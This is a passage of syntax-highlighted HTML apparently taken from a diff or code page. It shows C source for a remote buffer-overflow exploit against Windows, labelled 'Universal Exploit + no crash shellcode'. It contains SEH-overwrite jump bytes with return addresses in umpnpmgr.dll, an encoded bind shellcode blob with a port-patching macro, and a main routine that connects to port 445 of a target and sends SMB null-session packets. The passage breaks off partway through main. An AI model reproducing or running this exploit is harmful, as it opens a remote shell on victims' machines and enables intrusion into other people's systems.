+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>67<span class="es0">\x</span>15<span class="es0">\x</span>7a<span class="es0">\x</span>76<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>67<span class="es0">\x</span>15<span class="es0">\x</span>7a<span class="es0">\x</span>76"</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; /* jmp over - entry point */</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90"</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; /* pop reg<span class="sy0">;</span> pop reg<span class="sy0">;</span> retn<span class="sy0">;</span> - umpnpmgr.<span class="me1">dll</span> */</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>67<span class="es0">\x</span>15<span class="es0">\x</span>7a<span class="es0">\x</span>76"</span> /* <span class="nu0">0x767a1567</span> */</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; /* jmp ebx - umpnpmgr.<span class="me1">dll</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>6f<span class="es0">\x</span>36<span class="es0">\x</span>7a<span class="es0">\x</span>76"</span> */</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>67<span class="es0">\x</span>15<span class="es0">\x</span>7a<span class="es0">\x</span>76"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>48<span class="es0">\x</span>4F<span class="es0">\x</span>44<span class="es0">\x</span>88<span class="es0">\x</span>90"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90"</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">unsigned char RPC_call_end<span class="br0">[</span><span class="br0">]</span> <span class="sy0">=</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>E0<span class="es0">\x</span>07<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>04<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">unsigned char bind_shellcode<span class="br0">[</span><span class="br0">]</span> <span class="sy0">=</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>29<span class="es0">\x</span>c9<span class="es0">\x</span>83<span class="es0">\x</span>e9<span class="es0">\x</span>b0<span class="es0">\x</span>d9<span class="es0">\x</span>ee<span class="es0">\x</span>d9<span class="es0">\x</span>74<span class="es0">\x</span>24<span class="es0">\x</span>f4<span class="es0">\x</span>5b<span class="es0">\x</span>81<span class="es0">\x</span>73<span class="es0">\x</span>13<span class="es0">\x</span>19"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>f5<span class="es0">\x</span>04<span class="es0">\x</span>37<span class="es0">\x</span>83<span class="es0">\x</span>eb<span class="es0">\x</span>fc<span class="es0">\x</span>e2<span class="es0">\x</span>f4<span class="es0">\x</span>e5<span class="es0">\x</span>9f<span class="es0">\x</span>ef<span class="es0">\x</span>7a<span class="es0">\x</span>f1<span class="es0">\x</span>0c<span class="es0">\x</span>fb<span class="es0">\x</span>c8"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>e6<span class="es0">\x</span>95<span class="es0">\x</span>8f<span class="es0">\x</span>5b<span class="es0">\x</span>3d<span class="es0">\x</span>d1<span class="es0">\x</span>8f<span class="es0">\x</span>72<span class="es0">\x</span>25<span class="es0">\x</span>7e<span class="es0">\x</span>78<span class="es0">\x</span>32<span class="es0">\x</span>61<span class="es0">\x</span>f4<span class="es0">\x</span>eb<span class="es0">\x</span>bc"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>56<span class="es0">\x</span>ed<span class="es0">\x</span>8f<span class="es0">\x</span>68<span class="es0">\x</span>39<span class="es0">\x</span>f4<span class="es0">\x</span>ef<span class="es0">\x</span>7e<span class="es0">\x</span>92<span class="es0">\x</span>c1<span class="es0">\x</span>8f<span class="es0">\x</span>36<span class="es0">\x</span>f7<span class="es0">\x</span>c4<span class="es0">\x</span>c4<span class="es0">\x</span>ae"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>b5<span class="es0">\x</span>71<span class="es0">\x</span>c4<span class="es0">\x</span>43<span class="es0">\x</span>1e<span class="es0">\x</span>34<span class="es0">\x</span>ce<span class="es0">\x</span>3a<span class="es0">\x</span>18<span class="es0">\x</span>37<span class="es0">\x</span>ef<span class="es0">\x</span>c3<span class="es0">\x</span>22<span class="es0">\x</span>a1<span class="es0">\x</span>20<span class="es0">\x</span>1f"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>6c<span class="es0">\x</span>10<span class="es0">\x</span>8f<span class="es0">\x</span>68<span class="es0">\x</span>3d<span class="es0">\x</span>f4<span class="es0">\x</span>ef<span class="es0">\x</span>51<span class="es0">\x</span>92<span class="es0">\x</span>f9<span class="es0">\x</span>4f<span class="es0">\x</span>bc<span class="es0">\x</span>46<span class="es0">\x</span>e9<span class="es0">\x</span>05<span class="es0">\x</span>dc"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>1a<span class="es0">\x</span>d9<span class="es0">\x</span>8f<span class="es0">\x</span>be<span class="es0">\x</span>75<span class="es0">\x</span>d1<span class="es0">\x</span>18<span class="es0">\x</span>56<span class="es0">\x</span>da<span class="es0">\x</span>c4<span class="es0">\x</span>df<span class="es0">\x</span>53<span class="es0">\x</span>92<span class="es0">\x</span>b6<span class="es0">\x</span>34<span class="es0">\x</span>bc"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>59<span class="es0">\x</span>f9<span class="es0">\x</span>8f<span class="es0">\x</span>47<span class="es0">\x</span>05<span class="es0">\x</span>58<span class="es0">\x</span>8f<span class="es0">\x</span>77<span class="es0">\x</span>11<span class="es0">\x</span>ab<span class="es0">\x</span>6c<span class="es0">\x</span>b9<span class="es0">\x</span>57<span class="es0">\x</span>fb<span class="es0">\x</span>e8<span class="es0">\x</span>67"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>e6<span class="es0">\x</span>23<span class="es0">\x</span>62<span class="es0">\x</span>64<span class="es0">\x</span>7f<span class="es0">\x</span>9d<span class="es0">\x</span>37<span class="es0">\x</span>05<span class="es0">\x</span>71<span class="es0">\x</span>82<span class="es0">\x</span>77<span class="es0">\x</span>05<span class="es0">\x</span>46<span class="es0">\x</span>a1<span class="es0">\x</span>fb<span class="es0">\x</span>e7"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>71<span class="es0">\x</span>3e<span class="es0">\x</span>e9<span class="es0">\x</span>cb<span class="es0">\x</span>22<span class="es0">\x</span>a5<span class="es0">\x</span>fb<span class="es0">\x</span>e1<span class="es0">\x</span>46<span class="es0">\x</span>7c<span class="es0">\x</span>e1<span class="es0">\x</span>51<span class="es0">\x</span>98<span class="es0">\x</span>18<span class="es0">\x</span>0c<span class="es0">\x</span>35"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>4c<span class="es0">\x</span>9f<span class="es0">\x</span>06<span class="es0">\x</span>c8<span class="es0">\x</span>c9<span class="es0">\x</span>9d<span class="es0">\x</span>dd<span class="es0">\x</span>3e<span class="es0">\x</span>ec<span class="es0">\x</span>58<span class="es0">\x</span>53<span class="es0">\x</span>c8<span class="es0">\x</span>cf<span class="es0">\x</span>a6<span class="es0">\x</span>57<span class="es0">\x</span>64"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>4a<span class="es0">\x</span>a6<span class="es0">\x</span>47<span class="es0">\x</span>64<span class="es0">\x</span>5a<span class="es0">\x</span>a6<span class="es0">\x</span>fb<span class="es0">\x</span>e7<span class="es0">\x</span>7f<span class="es0">\x</span>9d<span class="es0">\x</span>1a<span class="es0">\x</span>55<span class="es0">\x</span>7f<span class="es0">\x</span>a6<span class="es0">\x</span>8d<span class="es0">\x</span>d6"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>8c<span class="es0">\x</span>9d<span class="es0">\x</span>a0<span class="es0">\x</span>2d<span class="es0">\x</span>69<span class="es0">\x</span>32<span class="es0">\x</span>53<span class="es0">\x</span>c8<span class="es0">\x</span>cf<span class="es0">\x</span>9f<span class="es0">\x</span>14<span class="es0">\x</span>66<span class="es0">\x</span>4c<span class="es0">\x</span>0a<span class="es0">\x</span>d4<span class="es0">\x</span>5f"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>bd<span class="es0">\x</span>58<span class="es0">\x</span>2a<span class="es0">\x</span>de<span class="es0">\x</span>4e<span class="es0">\x</span>0a<span class="es0">\x</span>d2<span class="es0">\x</span>64<span class="es0">\x</span>4c<span class="es0">\x</span>0a<span class="es0">\x</span>d4<span class="es0">\x</span>5f<span class="es0">\x</span>fc<span class="es0">\x</span>bc<span class="es0">\x</span>82<span class="es0">\x</span>7e"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>4e<span class="es0">\x</span>0a<span class="es0">\x</span>d2<span class="es0">\x</span>67<span class="es0">\x</span>4d<span class="es0">\x</span>a1<span class="es0">\x</span>51<span class="es0">\x</span>c8<span class="es0">\x</span>c9<span class="es0">\x</span>66<span class="es0">\x</span>6c<span class="es0">\x</span>d0<span class="es0">\x</span>60<span class="es0">\x</span>33<span class="es0">\x</span>7d<span class="es0">\x</span>60"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>e6<span class="es0">\x</span>23<span class="es0">\x</span>51<span class="es0">\x</span>c8<span class="es0">\x</span>c9<span class="es0">\x</span>93<span class="es0">\x</span>6e<span class="es0">\x</span>53<span class="es0">\x</span>7f<span class="es0">\x</span>9d<span class="es0">\x</span>67<span class="es0">\x</span>5a<span class="es0">\x</span>90<span class="es0">\x</span>10<span class="es0">\x</span>6e<span class="es0">\x</span>67"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>40<span class="es0">\x</span>dc<span class="es0">\x</span>c8<span class="es0">\x</span>be<span class="es0">\x</span>fe<span class="es0">\x</span>9f<span class="es0">\x</span>40<span class="es0">\x</span>be<span class="es0">\x</span>fb<span class="es0">\x</span>c4<span class="es0">\x</span>c4<span class="es0">\x</span>c4<span class="es0">\x</span>b3<span class="es0">\x</span>0b<span class="es0">\x</span>46<span class="es0">\x</span>1a"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>e7<span class="es0">\x</span>b7<span class="es0">\x</span>28<span class="es0">\x</span>a4<span class="es0">\x</span>94<span class="es0">\x</span>8f<span class="es0">\x</span>3c<span class="es0">\x</span>9c<span class="es0">\x</span>b2<span class="es0">\x</span>5e<span class="es0">\x</span>6c<span class="es0">\x</span>45<span class="es0">\x</span>e7<span class="es0">\x</span>46<span class="es0">\x</span>12<span class="es0">\x</span>c8"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>6c<span class="es0">\x</span>b1<span class="es0">\x</span>fb<span class="es0">\x</span>e1<span class="es0">\x</span>42<span class="es0">\x</span>a2<span class="es0">\x</span>56<span class="es0">\x</span>66<span class="es0">\x</span>48<span class="es0">\x</span>a4<span class="es0">\x</span>6e<span class="es0">\x</span>36<span class="es0">\x</span>48<span class="es0">\x</span>a4<span class="es0">\x</span>51<span class="es0">\x</span>66"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>e6<span class="es0">\x</span>25<span class="es0">\x</span>6c<span class="es0">\x</span>9a<span class="es0">\x</span>c0<span class="es0">\x</span>f0<span class="es0">\x</span>ca<span class="es0">\x</span>64<span class="es0">\x</span>e6<span class="es0">\x</span>23<span class="es0">\x</span>6e<span class="es0">\x</span>c8<span class="es0">\x</span>e6<span class="es0">\x</span>c2<span class="es0">\x</span>fb<span class="es0">\x</span>e7"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>92<span class="es0">\x</span>a2<span class="es0">\x</span>f8<span class="es0">\x</span>b4<span class="es0">\x</span>dd<span class="es0">\x</span>91<span class="es0">\x</span>fb<span class="es0">\x</span>e1<span class="es0">\x</span>4b<span class="es0">\x</span>0a<span class="es0">\x</span>d4<span class="es0">\x</span>5f<span class="es0">\x</span>f6<span class="es0">\x</span>3b<span class="es0">\x</span>e4<span class="es0">\x</span>57"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>4a<span class="es0">\x</span>0a<span class="es0">\x</span>d2<span class="es0">\x</span>c8<span class="es0">\x</span>c9<span class="es0">\x</span>f5<span class="es0">\x</span>04<span class="es0">\x</span>37"</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1"><span class="co1">#define SET_PORTBIND_PORT(buf, port) \</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; *<span class="br0">(</span>unsigned short *<span class="br0">)</span><span class="br0">(</span><span class="br0">(</span><span class="br0">(</span>buf<span class="br0">)</span>+<span class="nu0">186</span><span class="br0">)</span><span class="br0">)</span> <span class="sy0">=</span> <span class="br0">(</span>port<span class="br0">)</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">void</div></li>
+<li class="li1"><div class="de1">convert_name<span class="br0">(</span>char *out<span class="sy0">,</span> char *name<span class="br0">)</span></div></li>
+<li class="li1"><div class="de1"><span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; unsigned <span class="kw2">long</span> <span class="kw2">len</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw2">len</span> <span class="sy0">=</span> strlen<span class="br0">(</span>name<span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; out +<span class="sy0">=</span> <span class="kw2">len</span> * <span class="nu0">2</span> - <span class="nu0">1</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">while</span> <span class="br0">(</span>len--<span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; *out-- <span class="sy0">=</span> <span class="st0">'<span class="es0">\x</span>00'</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; *out-- <span class="sy0">=</span> name<span class="br0">[</span><span class="kw2">len</span><span class="br0">]</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1"><span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1"><span class="kw2">int</span></div></li>
+<li class="li1"><div class="de1">main <span class="br0">(</span><span class="kw2">int</span> argc<span class="sy0">,</span> char **argv<span class="br0">)</span></div></li>
+<li class="li1"><div class="de1"><span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw3">struct</span> sockaddr_in addr<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw3">struct</span> hostent *he<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw2">int</span> <span class="kw2">len</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw2">int</span> sockfd<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; unsigned short smblen<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; unsigned short bindport<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; unsigned char tmp<span class="br0">[</span><span class="nu0">1024</span><span class="br0">]</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; unsigned char packet<span class="br0">[</span><span class="nu0">4096</span><span class="br0">]</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; unsigned char *ptr<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; char recvbuf<span class="br0">[</span><span class="nu0">4096</span><span class="br0">]</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1"><span class="co1">#ifdef _WIN32</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; WSADATA wsa<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; WSAStartup<span class="br0">(</span>MAKEWORD<span class="br0">(</span><span class="nu0">2</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">,</span> &amp;wsa<span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#endif</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span> &nbsp; &nbsp; &nbsp;Microsoft Windows Remote Buffer Overflow<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\t</span> &nbsp; &nbsp; &nbsp; &nbsp; Universal Exploit + no crash shellcode<span class="es0">\n</span><span class="es0">\n</span><span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\t</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Copyright (c) 2022 .: ClumsyLulz :.<span class="es0">\n</span><span class="es0">\n</span><span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span>argc <span class="sy0">&lt;</span> <span class="nu0">3</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"%s &lt;host&gt; &lt;bind port&gt;<span class="es0">\n</span>"</span><span class="sy0">,</span> argv<span class="br0">[</span><span class="nu0">0</span><span class="br0">]</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span><span class="br0">(</span>he <span class="sy0">=</span> gethostbyname<span class="br0">(</span>argv<span class="br0">[</span><span class="nu0">1</span><span class="br0">]</span><span class="br0">)</span><span class="br0">)</span> <span class="sy0">==</span> NULL<span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"[-] Unable to resolve %s<span class="es0">\n</span>"</span><span class="sy0">,</span> argv<span class="br0">[</span><span class="nu0">1</span><span class="br0">]</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span><span class="br0">(</span>sockfd <span class="sy0">=</span> <span class="kw3">socket</span><span class="br0">(</span>AF_INET<span class="sy0">,</span> SOCK_STREAM<span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="br0">)</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"[-] socket failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; addr.<span class="me1">sin_family</span> <span class="sy0">=</span> AF_INET<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; addr.<span class="me1">sin_port</span> <span class="sy0">=</span> htons<span class="br0">(</span><span class="nu0">445</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; addr.<span class="me1">sin_addr</span> <span class="sy0">=</span> *<span class="br0">(</span><span class="br0">(</span><span class="kw3">struct</span> in_addr *<span class="br0">)</span>he-<span class="sy0">&gt;</span>h_addr<span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; memset<span class="br0">(</span>&amp;<span class="br0">(</span>addr.<span class="me1">sin_zero</span><span class="br0">)</span><span class="sy0">,</span> <span class="st0">'<span class="es0">\0</span>'</span><span class="sy0">,</span> <span class="nu0">8</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[*] connecting to %s:445..."</span><span class="sy0">,</span> argv<span class="br0">[</span><span class="nu0">1</span><span class="br0">]</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span>connect<span class="br0">(</span>sockfd<span class="sy0">,</span> <span class="br0">(</span><span class="kw3">struct</span> sockaddr *<span class="br0">)</span>&amp;addr<span class="sy0">,</span> sizeof<span class="br0">(</span><span class="kw3">struct</span> sockaddr<span class="br0">)</span><span class="br0">)</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] connect failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"ok<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"[*] null session..."</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span>send<span class="br0">(</span>sockfd<span class="sy0">,</span> SMB_Negotiate<span class="sy0">,</span> sizeof<span class="br0">(</span>SMB_Negotiate<span class="br0">)</span>-<span class="nu0">1</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] send failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw2">len</span> <span class="sy0">=</span> recv<span class="br0">(</span>sockfd<span class="sy0">,</span> recvbuf<span class="sy0">,</span> <span class="nu0">4096</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span><span class="br0">(</span><span class="kw2">len</span> <span class="sy0">&lt;=</span> <span class="nu0">10</span><span class="br0">)</span> || <span class="br0">(</span>recvbuf<span class="br0">[</span><span class="nu0">9</span><span class="br0">]</span> <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">)</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span>send<span class="br0">(</span>sockfd<span class="sy0">,</span> SMB_SessionSetupAndX<span class="sy0">,</span> sizeof<span class="br0">(</span>SMB_SessionSetupAndX<span class="br0">)</span>-<span class="nu0">1</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] send failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
